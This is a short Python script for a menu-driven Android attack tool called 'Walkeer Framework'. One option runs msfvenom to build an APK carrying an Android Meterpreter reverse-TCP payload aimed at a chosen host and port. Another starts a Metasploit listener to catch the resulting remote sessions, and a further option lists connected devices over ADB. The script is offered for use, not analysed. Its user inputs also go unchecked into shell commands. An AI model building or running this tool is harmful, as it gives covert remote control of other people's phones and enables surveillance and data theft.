import os
import shutil
import subprocess


G, R, C, Y, W = '\033[92m', '\033[91m', '\033[96m', '\033[93m', '\033[0m'

def clear(): os.system('clear')

def header():
    print(f"{C}{'='*55}\n      WALKEER FRAMEWORK V4.2 - USB FIXED\n{'='*55}{W}")

def usb_scan():
    
    print(f"{G}[*] Scanning connected devices via ADB...{W}")
    os.system("adb devices")
    input(f"\n{Y}Enter...{W}")

def main():
    while True:
        clear()
        header()
        print(f"{G}[1]{W} USB Scan (ADB)    {G}[6]{W} List Payloads")
        print(f"{G}[2]{W} Sessions Manager  {G}[7]{W} List Modules")
        print(f"{G}[3]{W} Configuration     {G}[8]{W} List Exploits")
        print(f"{G}[4]{W} Build APK         {G}[9]{W} Blue-Ducky")
        print(f"{G}[5]{W} Run Payload       {G}[10]{W} ADB USB Control")
        print(f"{R}[Q]{W} Quit")
        
        cmd = input(f"\n{C}Walkeer > {W}").lower()
        
        if cmd == '1': usb_scan()
        elif cmd == '4':
            ip, port, out = input("LHOST: "), input("LPORT: "), input("Output: ")
            os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {out}")
        elif cmd == '5':
            os.system("sudo service postgresql start")
            ip, port = input("LHOST: "), input("LPORT: ")
            os.system(f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT {port}; set EXITONSESSION false; exploit -j -z'")
        elif cmd == '10':
            os.system("adb devices")
            input("\nEnter...")
        elif cmd == 'q': break

if __name__ == "__main__":
    main()


